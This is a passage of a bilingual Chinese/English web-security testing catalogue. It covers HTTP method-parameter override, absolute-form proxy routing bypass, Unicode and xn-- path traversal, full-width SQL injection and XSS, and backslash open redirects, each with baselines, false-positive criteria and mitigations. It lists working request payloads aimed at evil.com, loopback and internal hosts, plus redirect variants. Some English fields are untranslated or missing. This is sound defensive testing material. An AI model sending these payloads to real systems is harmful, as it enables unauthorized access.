An ordinary field, reflection, invalid-method errors, a same-named code variable, continued authorization denial, unchanged object, or a separate _method flaw is not positive evidence for this entry.

opsecTips.zh: 自定义参数首次改变 canary 后停止，不扩展到命令式 method 值或真实资源。
opsecTips.en: Stop after the custom parameter first changes the canary; do not expand into command-like method values or real resources.

opsecTips.zh: 回滚并删除合成对象，清除业务 trace/缓存和测试会话，并恢复显式操作白名单与授权。
opsecTips.en: Roll back and delete synthetic objects, clear business traces, caches, and test sessions, and restore explicit operation allowlisting and authorization.

title.zh: 建立自定义方法参数基线
title.en: Establish the Custom Method Parameter baseline

description.zh: 记录无 method 参数的外层 POST 与直接目标方法在测试端点的授权结果，并保存原始请求、响应与服务端关联标识。
description.en: Record authorization outcomes for an outer POST without the parameter and for the direct target method on a test endpoint, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行自定义方法参数变体
title.en: Execute the Custom Method Parameter variants

description.zh: 逐项提交原始 method 值并记录路由、控制器动作和最终资源状态，严格保持其他变量不变并设置停止阈值。
description.en: Submit original method values one at a time and record routing, controller action, and final resource state, holding all other variables constant and defining a stop threshold.

attackChain.payload:
method=PUT
method=DELETE
method=PATCH
method=OPTIONS
method=TRACE
method=CONNECT
method=PROPFIND
method=MOVE
method=COPY

title.zh: 核验method 参数动词覆盖证据
title.en: Verify evidence for method Parameter Verb Override

description.zh: 确认参数触发了与真实受限动词等价的服务端动作并绕过基线拒绝；同时排除参数只是普通业务字段、被忽略、回显或映射到无害查询。
description.en: Confirm that the parameter triggers a server action equivalent to the restricted verb and bypasses the baseline denial; also exclude The parameter being an ordinary business field, ignored, reflected, or mapped to a harmless query.

overview.zh: 该集合与 _method 条目分开，针对无下划线的自定义约定，必须确认应用是否真实消费该参数。本条按HTTP 授权与路由边界审查；应在隔离资源上逐项执行，固定身份、路径、方法和除当前变量外的所有请求条件。
overview.en: This set is separate from _method and targets a custom unprefixed convention, requiring proof that the application consumes it. This entry is reviewed as a HTTP authorization and routing boundary; Execute one item at a time against an isolated resource while fixing identity, path, method, and every request condition except the tested variable.

vulnerability.zh: 如果应用根据 method 参数分派写操作而安全层只检查真实请求方法，可能产生方法级授权缺口。确认标准是确认参数触发了与真实受限动词等价的服务端动作并绕过基线拒绝；参数只是普通业务字段、被忽略、回显或映射到无害查询不能作为漏洞证据。
vulnerability.en: If the application dispatches write actions from the method parameter while security checks only the actual request method, method-level authorization gaps may result. Confirmation requires Confirm that the parameter triggers a server action equivalent to the restricted verb and bypasses the baseline denial; The parameter being an ordinary business field, ignored, reflected, or mapped to a harmless query is not vulnerability evidence.

exploitation.zh: 1. 记录无 method 参数的外层 POST 与直接目标方法在测试端点的授权结果；2. 逐项提交原始 method 值并记录路由、控制器动作和最终资源状态；3. 确认参数触发了与真实受限动词等价的服务端动作并绕过基线拒绝。参数只是普通业务字段、被忽略、回显或映射到无害查询应记录为误报。
exploitation.en: 1. Record authorization outcomes for an outer POST without the parameter and for the direct target method on a test endpoint. 2. Submit original method values one at a time and record routing, controller action, and final resource state. 3. Confirm that the parameter triggers a server action equivalent to the restricted verb and bypasses the baseline denial. Treat The parameter being an ordinary business field, ignored, reflected, or mapped to a harmless query as false positives.

mitigation.zh: 1. 避免用普通参数模拟 HTTP 方法；2. 在控制器动作内部执行与真实方法相同的授权；3. 为 method 与 _method 约定分别建立负向测试。
mitigation.en: 1. Avoid simulating HTTP methods through ordinary parameters. 2. Apply the same authorization inside controller actions as for real methods. 3. Add separate negative tests for method and _method conventions.

name.zh: 绝对形式 Request-Target 路由绕过

description.zh: 使用绝对 URI 请求行检查代理是否按请求目标中的 authority 路由，而应用授权仍依据 Host 或路径。
description.en: Uses absolute-URI request lines to test whether proxies route by request-target authority while application authorization relies on Host or path.

prerequisites.zh: 在隔离代理链固定 TCP 目标、TLS SNI、Host、无权限主体和 `/admin` canary，确认是否接受 absolute-form。
prerequisites.en: In an isolated proxy chain, fix TCP target, TLS SNI, Host, unauthorized principal, and /admin canary, confirming whether absolute-form is accepted.

prerequisites.zh: 逐个改变 request-target authority，记录代理选取 authority、转发 Host/路径和后端 vhost/授权 handler。
prerequisites.en: Change request-target authority one at a time, recording proxy-selected authority, forwarded Host and path, and backend virtual host or authorization handler.

title.zh: 绝对URI覆盖方法
title.en: Validation step 1 for Absolute-Form Request-Target Routing Bypass

execution.command:
GET http://evil.com/admin HTTP/1.1
GET http://127.0.0.1/admin HTTP/1.1
GET http://localhost/admin HTTP/1.1
GET http://internal/admin HTTP/1.1

description.zh: 绝对URI覆盖方法包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Absolute-Form Request-Target Routing Bypass validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求代理按 absolute-form authority 路由到内部/环回后端，而授权仍依据另一 Host/路径并返回内部 canary，跨层日志可关联。代理拒绝 absolute-form、400/421、直接外部代理功能按设计、DNS 解析、默认站点、SNI 已选择目标或无权限仍被拒绝都不是绕过。
analysis.en: Positive evidence requires the proxy to route by absolute-form authority to an internal or loopback backend while authorization relies on another Host or path and returns the internal canary, correlated across tiers. Rejected absolute-form, HTTP 400 or 421, intentional forward-proxy behavior, DNS resolution, default site, SNI already selecting the target, or continued authorization denial is not bypass.

opsecTips.zh: 一个内部 canary 首次由 absolute-form 路由返回后停止，不代理到真实外域或内网服务。
opsecTips.en: Stop after one internal canary is first returned through absolute-form routing; do not proxy to real external or internal services.

opsecTips.zh: 删除 vhost/canary fixture，关闭代理连接并清理 trace/缓存，恢复 authority 一致性和非代理入口拒绝。
opsecTips.en: Delete virtual-host and canary fixtures, close proxy connections, clear traces and caches, and restore authority consistency and rejection at nonproxy ingress.

title.zh: 建立代理 absolute-form 解析基线
title.en: Establish the Proxy Absolute-Form Parsing baseline

description.zh: 记录 origin-form 请求与合法 absolute-form 请求在代理和后端的目标主机与路由，并保存原始请求、响应与服务端关联标识。
description.en: Record proxy and backend target host and route for origin-form and legitimate absolute-form requests, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行代理 absolute-form 解析变体
title.en: Execute the Proxy Absolute-Form Parsing variants

description.zh: 逐项发送原始 absolute-form 请求行，在隔离代理环境固定 Host、SNI 和客户端身份，严格保持其他变量不变并设置停止阈值。
description.en: Send original absolute-form request lines one at a time in an isolated proxy environment while fixing Host, SNI, and client identity, holding all other variables constant and defining a stop threshold.

attackChain.payload:
GET http://evil.com/admin HTTP/1.1
GET http://127.0.0.1/admin HTTP/1.1
GET http://localhost/admin HTTP/1.1
GET http://internal/admin HTTP/1.1

title.zh: 核验绝对形式 Request-Target 路由绕过证据
title.en: Verify evidence for Absolute-Form Request-Target Routing Bypass

description.zh: 确认代理实际连接到请求目标 authority 指定的测试上游且绕过预期路由策略；同时排除统一 400、代理规范化到 Host、仅日志显示 URI 或浏览器不支持发送。
description.en: Confirm that the proxy connects to the test upstream named by request-target authority and bypasses expected routing policy; also exclude Uniform 400 responses, proxy normalization to Host, URI shown only in logs, or browser inability to send.

overview.zh: 原集合把外部、环回和内部主机写入 absolute-form 请求目标，针对代理与源站的 authority 优先级。本条按HTTP 授权与路由边界审查；应在隔离资源上逐项执行，固定身份、路径、方法和除当前变量外的所有请求条件。
overview.en: The original set places external, loopback, and internal hosts in absolute-form request targets to test authority precedence between proxy and origin. This entry is reviewed as a HTTP authorization and routing boundary; Execute one item at a time against an isolated resource while fixing identity, path, method, and every request condition except the tested variable.

vulnerability.zh: 若代理采用绝对 URI 主机而安全规则采用 Host，攻击者可能让请求转发到非预期内部上游或绕过虚拟主机控制。确认标准是确认代理实际连接到请求目标 authority 指定的测试上游且绕过预期路由策略；统一 400、代理规范化到 Host、仅日志显示 URI 或浏览器不支持发送不能作为漏洞证据。
vulnerability.en: If a proxy uses the absolute-URI host while security rules use Host, an attacker may route to an unintended internal upstream or bypass virtual-host controls. Confirmation requires Confirm that the proxy connects to the test upstream named by request-target authority and bypasses expected routing policy; Uniform 400 responses, proxy normalization to Host, URI shown only in logs, or browser inability to send is not vulnerability evidence.

exploitation.zh: 1. 记录 origin-form 请求与合法 absolute-form 请求在代理和后端的目标主机与路由；2. 逐项发送原始 absolute-form 请求行，在隔离代理环境固定 Host、SNI 和客户端身份；3. 确认代理实际连接到请求目标 authority 指定的测试上游且绕过预期路由策略。统一 400、代理规范化到 Host、仅日志显示 URI 或浏览器不支持发送应记录为误报。
exploitation.en: 1. Record proxy and backend target host and route for origin-form and legitimate absolute-form requests. 2. Send original absolute-form request lines one at a time in an isolated proxy environment while fixing Host, SNI, and client identity. 3. Confirm that the proxy connects to the test upstream named by request-target authority and bypasses expected routing policy. Treat Uniform 400 responses, proxy normalization to Host, URI shown only in logs, or browser inability to send as false positives.

mitigation.zh: 1. 对非代理入口拒绝 absolute-form 请求目标；2. 统一校验 request-target authority、Host 和 TLS SNI；3. 上游路由使用固定映射并阻断客户端选择私网目标。
mitigation.en: 1. Reject absolute-form request targets on nonproxy ingress. 2. Validate request-target authority, Host, and TLS SNI consistently. 3. Use fixed upstream mappings and prevent clients from selecting private targets.

name.zh: Unicode 点字符路径穿越

description.zh: 使用 Unicode 相似点字符构造父目录序列，检查过滤器与文件系统规范化是否产生路径穿越。
description.en: Uses Unicode lookalike dot characters to construct parent-directory sequences and test filtering versus filesystem normalization.

subCategory.zh: 路径规范化与文件访问

prerequisites.zh: 在可销毁目录树中放置随机 marker 文件，固定应用字符集、Unicode normalization、URL 解码和文件系统 realpath。
prerequisites.en: Place a random marker file in a disposable directory tree, pinning application charset, Unicode normalization, URL decoding, and filesystem realpath behavior.

prerequisites.zh: 逐个 lookalike 点序列配对 ASCII `../`、普通文件名和不存在路径，记录每层 code point 与最终规范路径。
prerequisites.en: Pair each lookalike-dot sequence with ASCII ../, a normal filename, and a nonexistent path, recording code points and final canonical path at every layer.

title.zh: Unicode路径穿越
title.en: Validation step 1 for Unicode Dot-Character Path Traversal

description.zh: Unicode路径穿越包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Unicode Dot-Character Path Traversal validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求过滤层允许 Unicode 点变体，后续兼容规范化把它还原为父目录跳转，并读取沙箱外随机 marker，realpath 日志证明边界越过。字符串被显示、文件不存在/403、ASCII 版本同样允许、浏览器字体看似双点、路径只在日志变化或访问仍位于根目录内都是假阳性。
analysis.en: Positive evidence requires the filter to allow a Unicode-dot variant, later compatibility normalization to restore parent traversal, and the random marker outside the sandbox root to be read, with realpath logs proving the boundary crossing. Displayed text, missing file or HTTP 403, equally allowed ASCII traversal, font-level visual similarity, log-only path changes, or access remaining inside the root is a false positive.

opsecTips.zh: 随机 marker 首次被读取后停止，不请求 `/etc`、`/proc`、日志、配置或真实 flag 路径。
opsecTips.en: Stop after the random marker is first read; do not request /etc, /proc, logs, configuration, or real flag paths.

opsecTips.zh: 删除目录树和 marker，清除路径 trace/缓存，并恢复规范化后 realpath 边界校验与允许目录。
opsecTips.en: Delete the directory tree and marker, clear path traces and caches, and restore post-normalization realpath boundary checks and allowed directories.

title.zh: 建立路径规范化与文件访问基线
title.en: Establish the Path Normalization and File Access baseline

description.zh: 在一次性目录创建随机测试文件，记录合法文件、普通 ../ 和不存在路径的响应，并保存原始请求、响应与服务端关联标识。
description.en: Create a random test file in a disposable directory and record responses for a valid file, ordinary ../, and a nonexistent path, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行路径规范化与文件访问变体
title.en: Execute the Path Normalization and File Access variants

description.zh: 逐项使用原始 Unicode 路径结构但只指向该随机测试文件，避免读取真实系统文件，严格保持其他变量不变并设置停止阈值。
description.en: Use original Unicode path structures one at a time but target only the random test file, avoiding real system files, holding all other variables constant and defining a stop threshold.

title.zh: 核验Unicode 点字符路径穿越证据
title.en: Verify evidence for Unicode Dot-Character Path Traversal

description.zh: 确认规范化后的实际文件路径越过根目录并返回随机标记内容；同时排除文件名文本回显、统一错误、路由重写或测试文件位于公开目录。
description.en: Confirm that the normalized filesystem path escapes the root and returns the random marker content; also exclude Filename reflection, generic errors, route rewriting, or the test file residing in a public directory.

overview.zh: 原始集合把双点替换为相似字符并指向系统、日志和配置文件，风险依赖 Unicode 映射与路径解码顺序。本条按路径规范化与文件访问边界审查；应只读取一次性目录中的随机标记文件，记录每一层解码、规范化和真实路径解析结果。
overview.en: The original set replaces double dots with lookalike characters and targets system, log, and configuration files, with risk depending on Unicode mapping and path-decoding order. This entry is reviewed as a path normalization and file-access boundary; Read only random marker files in a disposable directory and record decoding, normalization, and real-path resolution at every layer.

vulnerability.zh: 若安全层未识别相似点而后端库规范化为 ../，攻击者可能逃离允许目录读取服务器文件。确认标准是确认规范化后的实际文件路径越过根目录并返回随机标记内容；文件名文本回显、统一错误、路由重写或测试文件位于公开目录不能作为漏洞证据。
vulnerability.en: If the security layer misses lookalike dots while a backend library normalizes them to ../, an attacker may escape the allowed directory and read server files. Confirmation requires Confirm that the normalized filesystem path escapes the root and returns the random marker content; Filename reflection, generic errors, route rewriting, or the test file residing in a public directory is not vulnerability evidence.

exploitation.zh: 1. 在一次性目录创建随机测试文件，记录合法文件、普通 ../ 和不存在路径的响应；2. 逐项使用原始 Unicode 路径结构但只指向该随机测试文件，避免读取真实系统文件；3. 确认规范化后的实际文件路径越过根目录并返回随机标记内容。文件名文本回显、统一错误、路由重写或测试文件位于公开目录应记录为误报。
exploitation.en: 1. Create a random test file in a disposable directory and record responses for a valid file, ordinary ../, and a nonexistent path. 2. Use original Unicode path structures one at a time but target only the random test file, avoiding real system files. 3. Confirm that the normalized filesystem path escapes the root and returns the random marker content. Treat Filename reflection, generic errors, route rewriting, or the test file residing in a public directory as false positives.

mitigation.zh: 1. 先执行明确 Unicode 规范化再解析路径；2. 解析后验证真实路径仍位于允许根目录内；3. 使用文件 ID 映射并拒绝路径分隔符和点段。
mitigation.en: 1. Apply explicit Unicode normalization before path parsing. 2. Verify after resolution that the real path remains under the allowed root. 3. Use file-ID mappings and reject separators and dot segments.

name.zh: 全角引号 SQL 注入规范化

description.zh: 使用全角引号和运算符检查输入层是否放行，而数据库驱动或预处理阶段将其转换为 SQL 元字符。
description.en: Uses full-width quotes and operators to test whether input validation permits them while a later driver or preprocessing stage converts them into SQL metacharacters.

prerequisites.zh: 使用隔离数据库和合成 marker 行，固定输入编码、框架 normalization、驱动字符集与 SQL 审计。
prerequisites.en: Use an isolated database and synthetic marker row, pinning input encoding, framework normalization, driver charset, and SQL auditing.

prerequisites.zh: 为全宽引号/运算符构造结构相同的恒真、恒假和规范 ASCII 配对，参数位置与其他请求条件不变。
prerequisites.en: Build structurally matched true, false, and canonical ASCII pairs for full-width quotes and operators, keeping parameter position and all other request conditions fixed.

title.zh: Unicode SQL注入
title.en: Validation step 1 for Full-Width Quote SQL Injection Normalization

description.zh: Unicode SQL注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Full-Width Quote SQL Injection Normalization validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求入口校验接受全宽变体，后续层将其转换为 SQL 元字符并让恒真/恒假结果稳定分离或返回 marker，数据库审计显示查询结构改变。数据库把全宽字符当普通数据、语法错误、输入回显、应用只规范化显示、WAF 放行但参数化仍安全或一次响应差异都属于假阳性。
analysis.en: Positive evidence requires entry validation to accept a full-width variant, a later tier to convert it into SQL metacharacters, and matched true and false results to separate or return the marker, with database auditing showing query-structure change. Treating full-width characters as data, syntax errors, reflection, display-only normalization, WAF acceptance with safe parameterization, or one response difference is a false positive.

opsecTips.zh: 一个 Unicode 变体首次产生 marker 真/假差异后停止，不继续 UNION、目录枚举或数据读取。
opsecTips.en: Stop after one Unicode variant first produces the marker true or false differential; do not continue to UNION, catalog enumeration, or data reads.

opsecTips.zh: 回滚 marker 数据，删除请求/SQL trace，清除 normalization 缓存并恢复参数化与规范化后校验。
opsecTips.en: Roll back marker data, delete request and SQL traces, clear normalization caches, and restore parameterization and post-normalization validation.

description.en: Record database parameter values and outcomes for plain text, ASCII quotes, and full-width quotes in a parameterized test query, retaining raw requests, responses, and server correlation identifiers.

description.en: Submit original Unicode SQL structures one at a time to an authorized test field while holding account and query conditions constant, holding all other variables constant and defining a stop threshold.

title.zh: 核验全角引号 SQL 注入规范化证据
title.en: Verify evidence for Full-Width Quote SQL Injection Normalization

description.zh: 通过数据库审计与结果差异确认字符被规范化后改变了 SQL 语法结构；同时排除应用错误、字符被当作普通数据、WAF 命中或仅响应编码变化。
description.en: Confirm through database audit and result differences that character normalization changes SQL syntax structure; also exclude Application errors, characters treated as ordinary data, WAF matches, or response-encoding changes only.

overview.zh: 原集合覆盖布尔、注释和 UNION 结构的全角引号版本，关键是各层是否发生兼容映射而非字符外观。本条按Unicode 规范化与 SQL 语法边界审查；应在参数化的测试查询和隔离数据上逐项验证，并同时记录应用字符转换与数据库审计结果。
overview.en: The original set covers full-width quote variants of boolean, comment, and UNION structures, focusing on compatibility mapping across layers rather than appearance. This entry is reviewed as a Unicode normalization and SQL syntax boundary; Validate one item at a time using parameterized test queries and isolated data while recording application character conversion and database audit results.

vulnerability.zh: 若过滤器在规范化前检查而后续层映射为 ASCII 引号，拼接 SQL 的应用可能出现注入。确认标准是通过数据库审计与结果差异确认字符被规范化后改变了 SQL 语法结构；应用错误、字符被当作普通数据、WAF 命中或仅响应编码变化不能作为漏洞证据。
vulnerability.en: If a filter checks before normalization while a later layer maps characters to ASCII quotes, applications that concatenate SQL may become injectable. Confirmation requires Confirm through database audit and result differences that character normalization changes SQL syntax structure; Application errors, characters treated as ordinary data, WAF matches, or response-encoding changes only is not vulnerability evidence.

exploitation.zh: 1. 使用参数化测试查询记录普通文本、ASCII 引号和全角引号的数据库参数值与结果；2. 逐项提交原始 Unicode SQL 结构到授权测试字段，保持账号和查询条件一致；3. 通过数据库审计与结果差异确认字符被规范化后改变了 SQL 语法结构。应用错误、字符被当作普通数据、WAF 命中或仅响应编码变化应记录为误报。
exploitation.en: 1. Record database parameter values and outcomes for plain text, ASCII quotes, and full-width quotes in a parameterized test query. 2. Submit original Unicode SQL structures one at a time to an authorized test field while holding account and query conditions constant. 3. Confirm through database audit and result differences that character normalization changes SQL syntax structure. Treat Application errors, characters treated as ordinary data, WAF matches, or response-encoding changes only as false positives.

mitigation.zh: 1. 所有查询使用参数化语句，禁止拼接输入；2. 在统一 Unicode 规范化后执行类型和长度验证；3. 对兼容字符映射和数据库字符集建立回归测试。
mitigation.en: 1. 所有查询使用参数化语句，禁止拼接输入；2. 在统一 Unicode 规范化后执行类型和长度验证；3. 对兼容字符映射和数据库字符集建立回归测试。

description.zh: 使用全角尖括号构造标签，检查后续规范化是否把过滤后文本恢复为可执行 HTML。
description.en: Uses full-width angle brackets to construct tags and tests whether later normalization restores filtered text to executable HTML.

prerequisites.zh: 固定应用和浏览器的 Unicode normalization、HTML parser、输出上下文与 CSP，记录最终 DOM code point。
prerequisites.en: Pin application and browser Unicode normalization, HTML parser, output context, and CSP, recording final DOM code points.

analysis.zh: 阳性要求过滤层保留全宽分隔符，后续规范化将其转换为真实 `< >`，浏览器构建元素并执行事件/脚本设置 canary。全宽字符只显示为文本、DOM 为 text node、ASCII 也被安全编码、CSP 拦截、事件不触发、浏览器不做兼容转换或 canary 由测试器预设均是假阳性。
analysis.en: Positive evidence requires the filter to retain full-width delimiters, later normalization to convert them into real angle brackets, and the browser to build an element and execute an event or script that sets the canary. Full-width text display, a DOM text node, safely encoded ASCII, CSP blocking, an untriggered event, no browser compatibility conversion, or a harness-set canary is a false positive.

opsecTips.zh: 一个全宽标签首次执行 DOM canary 后停止，不读取 Cookie、加载外部资源或持久化输入。
opsecTips.en: Stop after one full-width tag first executes the DOM canary; do not read cookies, load external resources, or persist input.

opsecTips.zh: 删除页面 fixture 与浏览器 profile，清除 DOM/缓存 trace，并恢复统一规范化、上下文编码和 CSP。
opsecTips.en: Delete page fixtures and browser profiles, clear DOM and cache traces, and restore consistent normalization, contextual encoding, and CSP.

title.zh: 核验全角标签 XSS 规范化证据
title.en: Verify evidence for Full-Width Tag XSS Normalization

description.zh: 确认某个后续阶段转换出真实标签，并由浏览器执行页面源中的标记代码；同时排除全角字符保持文本、浏览器不解析、输出编码或扩展脚本触发。
description.en: Confirm that a later stage creates real tags and the browser executes marker code in the page origin; also exclude Full-width characters remaining text, browser nonparsing, output encoding, or extension-triggered script.

overview.zh: 原集合覆盖 script、媒体、表单和事件元素的全角标签版本，风险取决于是否发生兼容规范化。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set covers full-width forms of script, media, form, and event elements, with risk depending on compatibility normalization. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 若净化器在 NFKC 等转换前运行而后续层把全角分隔符转换为 ASCII，危险标签可能在过滤后重现。确认标准是确认某个后续阶段转换出真实标签，并由浏览器执行页面源中的标记代码；全角字符保持文本、浏览器不解析、输出编码或扩展脚本触发不能作为漏洞证据。
vulnerability.en: If sanitization runs before a compatibility transform such as NFKC and a later layer converts delimiters to ASCII, dangerous tags may reappear after filtering. Confirmation requires Confirm that a later stage creates real tags and the browser executes marker code in the page origin; Full-width characters remaining text, browser nonparsing, output encoding, or extension-triggered script is not vulnerability evidence.

exploitation.zh: 1. 记录全角普通文本和标准安全标签经过存储、模板、DOM 的每阶段字节与字符；2. 逐项提交原始全角标签，但将脚本动作替换为随机 DOM 标记并在隔离浏览器观察；3. 确认某个后续阶段转换出真实标签，并由浏览器执行页面源中的标记代码。全角字符保持文本、浏览器不解析、输出编码或扩展脚本触发应记录为误报。
exploitation.en: 1. Record bytes and characters at storage, template, and DOM stages for full-width plain text and a standard safe tag. 2. Submit original full-width tags one at a time while replacing script actions with a random DOM marker in an isolated browser. 3. Confirm that a later stage creates real tags and the browser executes marker code in the page origin. Treat Full-width characters remaining text, browser nonparsing, output encoding, or extension-triggered script as false positives.

mitigation.zh: 1. 在规范化后执行上下文输出编码和 HTML 净化；2. 定义单一 Unicode 规范并避免过滤后再次转换；3. 部署 CSP 与 Trusted Types 并测试全角和兼容字符。
mitigation.en: 1. 在规范化后执行上下文输出编码和 HTML 净化；2. 定义单一 Unicode 规范并避免过滤后再次转换；3. 部署 CSP 与 Trusted Types 并测试全角和兼容字符。

name.zh: xn-- 前缀路径穿越混淆

description.zh: 使用看似 Punycode 的 xn-- 路径前缀拼接 ../，检查 URL 主机识别与文件路径解析是否被错误混合。
description.en: Uses an xn-- looking path prefix followed by ../ sequences to test whether URL host recognition and filesystem path parsing are incorrectly mixed.

subCategory.zh: IDN 前缀误用与路径解析
subCategory.en: IDN Prefix Misuse and Path Parsing

prerequisites.zh: 把 `xn--` 仅视为路径前缀，在可销毁目录树创建根内与根外随机 marker，并固定 URL/文件路径解析。
prerequisites.en: Treat xn-- only as a path prefix, create random markers inside and outside a disposable root, and pin URL and filesystem path parsing.

prerequisites.zh: 配对 `xn--/../../../`、普通目录名、ASCII traversal 与不存在路径，记录每层解码和最终 realpath。
prerequisites.en: Pair xn--/../../../ with a normal directory name, ASCII traversal, and nonexistent path, recording every decode and final realpath.

analysis.zh: 阳性要求应用把含 xn-- 前缀的路径错误通过校验，随后仍解析 `../` 并读取根外随机 marker，realpath 证明越界。系统将其当普通目录、文件不存在、请求被拒绝、IDNA 库参与主机解析但非路径、只返回错误页、ASCII traversal 同样被允许或未读取 marker 都是假阳性。

Treating it as an ordinary directory, missing file, rejection, IDNA host parsing unrelated to path, an error page, equally allowed ASCII traversal, or no marker read is a false positive.

opsecTips.en: Stop after the outside-root random marker is first read; do not request system files, logs, environment data, or real flags.

opsecTips.zh: 删除测试目录/marker，清除 URL 与 realpath trace，并恢复路径规范化后根目录约束。

overview.zh: 原内容并不是合法 IDN 域名集合，而是 xn--/../../../ 形式的文件路径，因此应按路径穿越验证。本条按路径规范化与文件访问边界审查；应只读取一次性目录中的随机标记文件，记录每一层解码、规范化和真实路径解析结果。
overview.en: The original content is not a valid IDN domain set; it contains xn--/../../../ file paths and must be evaluated as path traversal. This entry is reviewed as a path normalization and file-access boundary; Read only random marker files in a disposable directory and record decoding, normalization, and real-path resolution at every layer.

vulnerability.zh: 若过滤器把 xn-- 前缀误判为已处理域名并跳过点段校验，后端文件操作可能解析后续 ../。确认标准是确认前置层放行而后端解析后的真实路径逃离允许根目录；xn-- 被当作普通目录、文件不存在、统一错误或没有文件系统接收点不能作为漏洞证据。
vulnerability.en: If a filter mistakes the xn-- prefix for a handled domain and skips dot-segment validation, backend file operations may resolve the following ../. Confirmation requires Confirm that the edge permits the value while the backend-resolved real path escapes the allowed root; xn-- treated as a normal directory, missing files, generic errors, or no filesystem sink is not vulnerability evidence.

exploitation.zh: 1. 在一次性文件根中创建随机标记并记录合法相对路径与普通 ../ 的处理；2. 逐项提交原始 xn-- 路径结构但只指向随机标记，记录 URL 与文件解析的中间结果；3. 确认前置层放行而后端解析后的真实路径逃离允许根目录。xn-- 被当作普通目录、文件不存在、统一错误或没有文件系统接收点应记录为误报。
exploitation.en: 1. Create a random marker under a disposable file root and record handling of a valid relative path and ordinary ../. 2. Submit original xn-- path structures one at a time targeting only the random marker and record intermediate URL and filesystem parsing. 3. Confirm that the edge permits the value while the backend-resolved real path escapes the allowed root. Treat xn-- treated as a normal directory, missing files, generic errors, or no filesystem sink as false positives.

mitigation.zh: 1. 明确区分 URL authority 与路径数据，不以字符串前缀推断类型；2. 对路径完成解码和规范化后验证真实根目录；3. 拒绝点段、分隔符和不符合 schema 的 xn-- 使用。
mitigation.en: 1. Separate URL authority from path data and never infer type from string prefixes. 2. Validate the real root after all path decoding and normalization. 3. Reject dot segments, separators, and xn-- usage that violates the input schema.

name.zh: 反斜杠 URL 解析开放重定向

description.zh: 使用 /\evil.com 等混合分隔符检查服务端 URL 校验与浏览器导航对 authority 的识别是否不同。
description.en: Uses mixed separators such as /\evil.com to test whether server URL validation and browser navigation identify different authorities.

subCategory.zh: 斜杠/反斜杠 authority 混淆

prerequisites.zh: 使用自有 HTTPS 接收域和真实目标浏览器，固定重定向 sink、允许路径与服务端 URL parser。
prerequisites.en: Use an owned HTTPS recipient and target browser, fixing redirect sink, allowed path, and server URL parser.

prerequisites.zh: 逐个测试斜杠/反斜杠数量和尾部形式，记录服务端规范 URL、Location 原始值和浏览器最终 authority。
prerequisites.en: Test slash and backslash counts and suffix forms individually, recording the server-canonical URL, raw Location, and browser-final authority.

title.zh: /\\evil.com

description.zh: /\\evil.com包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: /\\evil.com contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求服务端把混合分隔符值判为相对/可信路径，而 WHATWG 浏览器最终导航到受控 evil.com canary，接收日志可确认。值出现在 Location、返回 3xx、浏览器将反斜杠保持为路径、外域无请求、用户手工导航、服务器已拒绝或仅非目标浏览器存在理论差异均是假阳性。
analysis.en: Positive evidence requires the server to classify a mixed-separator value as relative or trusted while a WHATWG browser finally navigates to the controlled evil.com canary, confirmed by recipient logs. A value in Location, HTTP 3xx, browser retaining backslashes as path, no external request, manual user navigation, server rejection, or theoretical difference only in a nontarget browser is a false positive.

opsecTips.zh: 浏览器首次到达受控 canary 后停止，不附加凭据、token 或多跳重定向。
opsecTips.en: Stop after the browser first reaches the controlled canary; do not append credentials, tokens, or multihop redirects.

opsecTips.zh: 删除接收日志、DNS 和重定向 fixture，清除浏览器历史/缓存，并恢复结构化 URL 解析和目标白名单。
opsecTips.en: Delete recipient logs, DNS, and redirect fixtures, clear browser history and caches, and restore structured URL parsing and destination allowlisting.

title.zh: 建立斜杠/反斜杠 authority 混淆基线
title.en: Establish the Slash and Backslash Authority Confusion baseline

description.zh: 记录普通相对路径、协议相对外部 URL 和单反斜杠值的结构化解析与浏览器目标，并保存原始请求、响应与服务端关联标识。
description.en: Record structured parsing and browser destinations for a normal relative path, protocol-relative external URL, and a single-backslash value, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行斜杠/反斜杠 authority 混淆变体
title.en: Execute the Slash and Backslash Authority Confusion variants

description.zh: 逐项提交原始混合分隔符变体，并把 evil.com 替换为自有测试接收域，严格保持其他变量不变并设置停止阈值。
description.en: Submit original mixed-separator variants one at a time and replace evil.com with an owned test receiver, holding all other variables constant and defining a stop threshold.

attackChain.payload:
/\\evil.com
/\\\\evil.com
/\\\\\\evil.com
/\\\\\\\\evil.com
/\\evil.com/
/\\evil.com//

title.zh: 核验反斜杠 URL 解析开放重定向证据
title.en: Verify evidence for Backslash URL Parsing Open Redirect

description.zh: 确认服务端允许该值且真实浏览器最终导航到未允许测试域；同时排除浏览器停留原站、值被编码、网络库拒绝或仅服务端日志显示外域。
description.en: Confirm that the server accepts the value and a real browser ultimately navigates to the unallowed test domain; also exclude Browser remaining on origin, encoded values, network-library rejection, or external domain shown only in server logs.

overview.zh: 原集合改变反斜杠数量与尾分隔符，针对 WHATWG 风格浏览器和 RFC 解析器之间的差异。本条按URL 解析与最终导航边界审查；应使用自有 HTTPS 接收域和真实浏览器逐项测试，并同时记录服务端解析结果与最终 authority。
overview.en: The original set varies backslash count and trailing separators to target differences between WHATWG-style browser and RFC parsers. This entry is reviewed as a URL parsing and final-navigation boundary; Use an owned HTTPS receiver and a real browser one item at a time while recording both server parsing and final authority.

vulnerability.zh: 若服务端把反斜杠视为普通路径而浏览器按斜杠处理，允许的相对 URL 可能导航到外部主机。确认标准是确认服务端允许该值且真实浏览器最终导航到未允许测试域；浏览器停留原站、值被编码、网络库拒绝或仅服务端日志显示外域不能作为漏洞证据。
